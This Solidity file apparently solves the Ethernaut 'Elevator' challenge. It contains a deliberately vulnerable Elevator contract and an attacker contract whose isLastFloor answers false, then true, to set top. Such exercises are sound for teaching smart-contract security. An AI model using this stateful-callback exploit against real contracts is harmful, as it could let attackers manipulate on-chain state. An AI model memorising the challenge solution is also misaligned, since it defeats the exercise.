// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract MyBuilding {
    IElevator elevator;
    uint256 public timesCalled;

    constructor(address _elevator) public {
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (timesCalled == 0) {
            timesCalled++;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        elevator.goTo(0);
    }
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
